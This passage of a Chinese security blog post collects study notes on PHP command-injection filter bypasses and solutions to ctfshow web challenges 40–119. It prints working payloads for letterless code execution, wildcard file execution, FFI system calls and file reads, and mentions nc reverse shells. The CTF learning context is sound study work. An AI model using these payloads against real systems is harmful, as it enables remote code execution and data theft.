+<li><code>$_=&quot;!((%)(&quot;^&quot;@[[@[\&quot;；$__=&quot;!+/((&quot;^&quot;~&#123;</code>{|”；$<em><strong>&#x3D;$$</strong>；$</em>($_<em>[‘</em>‘]);&#96;照理来说是没错 但不懂为啥没成功</li>
+</ul>
+</li>
+<li>可以nc反弹shell 如果是反引号不回显的话</li>
+<li>这边这种无字母数字的靶场<ul>
+<li>方法都一样 先取决于版本 然后通过不同过滤使用不同方法 </li>
+<li><code>?cmd=$_=；$__=；$___=$$__；$_($___[_]);</code></li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="无字母数字-取反绕过"><a href="#无字母数字-取反绕过" class="headerlink" title="无字母数字-取反绕过"></a>无字母数字-取反绕过</h2><ul>
+<li>~() 通过这个取反</li>
+<li>0b0110 变成 0b1001</li>
+<li>这编主要还是利用脚本来构造payload</li>
+<li>构造的payload和上面一样 不过所用到的原理不同</li>
+<li>一个中文分号拦我一个点 坠了</li>
+<li><code>$_=~(&quot;%9e%8c%8c%9a%8d%8b&quot;);$__=~(&quot;%a0%af%b0%ac%ab&quot;);$___=$$__;$_($___[_]);</code></li>
+</ul>
+<h2 id="无字母数字-自增绕过"><a href="#无字母数字-自增绕过" class="headerlink" title="无字母数字-自增绕过"></a>无字母数字-自增绕过</h2><ul>
+<li>通过++自增 <ul>
+<li>a++是先a再++</li>
+<li>++a是先++再输出a</li>
+</ul>
+</li>
+<li>所以可以先<ul>
+<li>$a&#x3D;A;</li>
+<li>++$a;++$a;++$a;++$a;</li>
+<li>echo $a;</li>
+<li>这样a的值就是E了</li>
+</ul>
+</li>
+<li>通过$_&#x3D;[].’’<ul>
+<li>echo $_[0];</li>
+<li>这样第一位就是A了</li>
+</ul>
+</li>
+<li>0可以用不存在的变量来替换 比如$__</li>
+<li>因为不存在是false所以他的值是0</li>
+<li>通过赋值 自增 拼接 再赋值 自增 拼接 就可以构造payload了</li>
+<li>.&#x3D; 是拼接的作用</li>
+</ul>
+<h2 id="无字母数字特殊符号绕过"><a href="#无字母数字特殊符号绕过" class="headerlink" title="无字母数字特殊符号绕过"></a>无字母数字特殊符号绕过</h2><ul>
+<li>短标签&#x3D;代替php</li>
+<li>下划线和$被过滤<ul>
+<li>php7</li>
+<li>($a)()</li>
+<li>call_user_func()</li>
+<li>(call_user_func)(system,whoami,’’) 取反</li>
+<li>php5</li>
+<li>文件读取 </li>
+<li>因为php中post上传文件的时候 文件会临时存到tmp目录下 默认文件名是phpXXXXXX x是随机的</li>
+<li>所以能用通配符？来匹配</li>
+<li>.&#x2F;???&#x2F;?????[@-[]这个表示ASCII在@和[之间的字符 也就是大写字母 来保证最后一位是大写的字母</li>
+<li>所以通过上传一句话木马 然后.&#x2F;会执行</li>
+</ul>
+</li>
+</ul>
+<h2 id="ctfshow命令执行解题记录"><a href="#ctfshow命令执行解题记录" class="headerlink" title="ctfshow命令执行解题记录"></a>ctfshow命令执行解题记录</h2><ul>
+<li><p>ctfshow web40</p>
+<ul>
+<li>这一题有多种方法 </li>
+<li>一个是打印出全局变量 发现使用next 能移动到POST的值 所以post里写命令执行函数</li>
+<li>然后GET传参里写?c&#x3D;eval(array_pop(next(get_defined_vars())));</li>
+<li>还有就是session也能用</li>
+<li>然后show_source(next(array_reverse(scandir(pos(localeconv())))));也能用</li>
+<li>var_dump() 可以代替print_f</li>
+<li>思路就是先查看当前目录下文件有哪些 再想办法读取到</li>
+</ul>
+</li>
+<li><p>web41</p>
+<ul>
+<li>&amp; 按位与 |按位或 ^ 按位异或 ~取反 为四大位运算符</li>
+<li>这一题是需要用或运算 就是 |</li>
+<li>然后php中 大小写都能算合法的函数写法</li>
+<li>且 (‘phpinfo’)(); 这样也是合法的</li>
+</ul>
+</li>
+<li><p>web42</p>
+<ul>
+<li>题目把我们的传参拼接了&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</li>
+<li>代表标准输出给到一个黑洞里 错误输出和标准输出一样</li>
+<li>可以使用||来绕过 表示执行前面的成功了 就不执行后面的了</li>
+<li>也可以双写绕过 ls;ls 用分号隔开了 表示后面的ls和拼接的代码单独执行</li>
+</ul>
+</li>
+<li><p>web43</p>
+<ul>
+<li>这题可以用||和&amp;&amp; 需要注意的是&amp;&amp;是第一条成功执行后执行下一条 但是他要url编码后提交 因为它是由特殊含义的</li>
+</ul>
+</li>
+<li><p>web46</p>
+<ul>
+<li>这里有个注意点</li>
+<li>为什么%09 这个tab符号 如果过滤了数字 他不会被过滤呢</li>
+<li>因为数字解码之后是大于0x30的 制表符不属于那个范围</li>
+<li>%0a表示换行 09是tab 20是空格</li>
+<li>nl可以代替tac 不过要看源代码 所以应该是代替cat</li>
+</ul>
+</li>
+<li><p>web52</p>
+<ul>
+<li>这里发现当前目录没有flag</li>
+<li>所以去根目录找一下 ls &#x2F; 列出根目录的文件名</li>
+<li>然后通过cp复制到别的地方</li>
+<li>cp${IFS}&#x2F;fl’’ag${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;a.txt||</li>
+</ul>
+</li>
+<li><p>web54</p>
+<ul>
+<li>这题目过滤的特别多 但是没过滤mv</li>
+<li>可以进行重命名</li>
+<li>mv flag.php a.txt</li>
+<li>?c&#x3D;&#x2F;bin&#x2F;c??${IFS}????.???这个也可以<ul>
+<li>因为如果写c??的话没法匹配到cat</li>
+<li>只有&#x2F;bin&#x2F;ca？这样才能匹配得到</li>
+</ul>
+</li>
+<li>cp啥的好像也行</li>
+</ul>
+</li>
+<li><p>web55</p>
+<ul>
+<li><p>这题解法蛮多的 属于无字母特殊符号的题目</p>
+</li>
+<li><p>一个是用&#x2F;bin目录下的可执行程序</p>
+<ul>
+<li>&#x2F;bin&#x2F;base64 flag.php</li>
+<li>替换后是&#x2F;???&#x2F;????64 ????.???</li>
+</ul>
+</li>
+<li><p>还有一种是bash执行 使用八进制和ascii转换</p>
+<ul>
+<li><pre><code class="hljs">$&#39;\154\163&#39;
+这个会执行ls 因为154是八进制 他的十进制是l对应的ascii位置
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">   -</span> 所以能用这个执行cat flag.php<br><br><span class="hljs-bullet">   -</span> <br><br><span class="hljs-bullet">-</span> 这一段表示cat *<br><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p>&#x2F;?c&#x3D;$’\143\141\164’%20*</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><br><br><span class="hljs-bullet">-</span> 然后这一题还有一个姿势<br><br><span class="hljs-bullet">  -</span> 通过.来执行文件<br><span class="hljs-bullet">  -</span> 然后我们可以构造一个表单 对这个服务器上传php文件<br><span class="hljs-bullet">  -</span> php文件会临时存放在/tmp/php 后面有六个随机字符 不过最后一个是大写 可以用[@[]来匹配大写 原因上面的笔记讲过了<br><span class="hljs-bullet">  -</span> 所以可以用bp抓包 文件内容是#!/bin/sh然后换行写payload 然后传参是.%20/???/????????[@-[]<br><span class="hljs-bullet">  -</span> 1.txt里面直接写ls才能成功不懂为啥<br><br><span class="hljs-bullet">-</span> web57<br><br><span class="hljs-bullet">  -</span> <span class="hljs-code">`$(())`</span> ：代表做一次运算<br><br><span class="hljs-bullet">  -</span> 因为里面是空的 所以值为零 运算出来结果也是零<br><br><span class="hljs-bullet">  -</span> 然后对零取反运算 结果是-1<br><br><span class="hljs-bullet">  -</span> $(( ~$(()) ))<br><br><span class="hljs-bullet">  -</span> 连着写两个就是-1-1=-2<br><br><span class="hljs-bullet">  -</span> -2取反得到1<br><br><span class="hljs-bullet">  -</span> 如果得到-37 那么取反就是36 <br><br><span class="hljs-bullet">  -</span> 所以在$(( ~$((    这里面放37个-1 也就是$((~$(())))   )) )) 然后外面那个~取反 也就是36<br><br><span class="hljs-bullet">  -</span> 可以通过python更快构造payload<br><br><span class="hljs-bullet">  -</span> <br><br>  - <span class="hljs-code">```python</span><br><span class="hljs-code">    get_reverse_number = &quot;$((~$((&#123;&#125;))))&quot; # 取反操作</span><br><span class="hljs-code">    negative_one = &quot;$((~$(())))&quot;		# -1</span><br><span class="hljs-code">    payload = get_reverse_number.format(negative_one*37)</span><br><span class="hljs-code">    print(payload)</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>web59</p>
+<ul>
+<li>c&#x3D;highlight_file(“flag.php”);</li>
+<li>show-source</li>
+<li>include require 也能试试</li>
+<li>readgzfile</li>
+</ul>
+</li>
+<li><p>web62</p>
+<ul>
+<li>print_r(scandir(dirname(‘FILE’)));</li>
+<li>这个用来扫描目录</li>
+<li>var_dump代替print_r</li>
+<li>var_export</li>
+<li>：?c&#x3D;echo(implode(‘—‘,scandir(“&#x2F;“)));</li>
+</ul>
+</li>
+<li><p>web71</p>
+<ul>
+<li><p>遇到缓冲区</p>
+</li>
+<li><p>可以使用</p>
+</li>
+<li></li>
+<li><pre><code class="language-php">ob_flush();
+ob_end_flush();
+exit();
+die();
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>web72</p>
+<ul>
+<li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}exit(0);</li>
+<li>使用这个payload可以扫描根目录下的所有文件</li>
+</ul>
+</li>
+<li><p>web75</p>
+<ul>
+<li>先扫描目录发现flag文件</li>
+<li>然后使用mysql的pdo读取</li>
+<li>c&#x3D;try {$dbh &#x3D; new PDO(‘mysql:host&#x3D;localhost;dbname&#x3D;ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“&#x2F;flag36d.txt”)’) as $row){echo($row[0]).”|”; }$dbh &#x3D; null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);</li>
+<li>但这里我读取没成功</li>
+<li>load_file<ul>
+<li>读取一个文件并且将其内容作为字符串返回</li>
+</ul>
+</li>
+<li>pdo 数据库访问接口</li>
+</ul>
+</li>
+<li><p>web77</p>
+<ul>
+<li>这一题是php7.4版本</li>
+<li>c&#x3D;$ffi &#x3D; FFI::cdef(“int system(const char *command);”);$a&#x3D;’&#x2F;readflag &gt; 1.txt’;$ffi-&gt;system($a);</li>
+<li>&#96;&#96;$ffi &#x3D; FFI::cdef(“int system(const char *command);”);  &#x2F;&#x2F;创建一个system对象<code> </code>$a&#x3D;’&#x2F;readflag &gt; 1.txt’;  &#x2F;&#x2F;因为页面不会回显，所以将内容输出到1.txt<code> $ffi-&gt;system($a);  //通过$ffi去调用system函数</code></li>
+</ul>
+</li>
+<li><p>web118</p>
+<ul>
+<li>这一题查看提示的png图片</li>
+<li>发现pwd里面有l</li>
+<li>环境变量bin有n</li>
+<li>所以可以构造nl 又因为提示flag.php 可以用????.???代替</li>
+<li>所以构造 ${PATH:<del>A}${PWD:</del>A}$IFS????.???</li>
+</ul>
+</li>
+<li><p>web119</p>
+<ul>
+<li><p>同样是通过各种方法</p>
+</li>
+<li><p>构造出&#x2F;bin&#x2F;cat flag.php</p>
+</li>
+<li><p>0：$、$:$} &#x3D; {${PWD}:0:1} &#x3D; &#x2F;</p>
+<p>${PWD:${SHLVL}:$</p>
+</li>
+</ul>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php命令执行总结</div>
+      <div>https://lolydawn.github.io/2024/01/22/php命令执行总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>lolydawn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 22, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/02/nacos%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="nacos历史漏洞复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">nacos历史漏洞复现</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/12/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/" title="php反序列化总结">
+                        <span class="hidden-mobile">php反序列化总结</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
